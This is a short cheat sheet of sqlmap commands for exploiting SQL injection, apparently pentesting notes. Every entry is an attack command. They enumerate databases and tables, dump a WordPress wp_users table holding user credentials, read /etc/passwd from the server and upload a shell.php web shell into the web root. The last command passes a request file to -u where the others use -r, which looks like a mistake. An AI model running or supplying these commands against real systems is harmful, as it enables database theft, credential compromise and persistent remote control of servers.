
### Find Databases:

```bash
sqlmap -r request.txt --dbs --batch
```

### Find Tables in a Database:

```bash
sqlmap -r request.txt --batch --dbms=mysql -D wordpress --tables
```

### Dumping Information from  a Table

```bash
sqlmap -r request.txt --batch --dbms=mysql -D wordpress -T wp_users --dump
```

### Read Files:

```bash
sqlmap -r request.txt --file-read=/etc/passwd --batch 
```

### Write Files:

```bash
sqlmap -u request.txt --file-write=/root/Desktop/shell.php --file-dest=/var/html/www/shell.php --batch
```

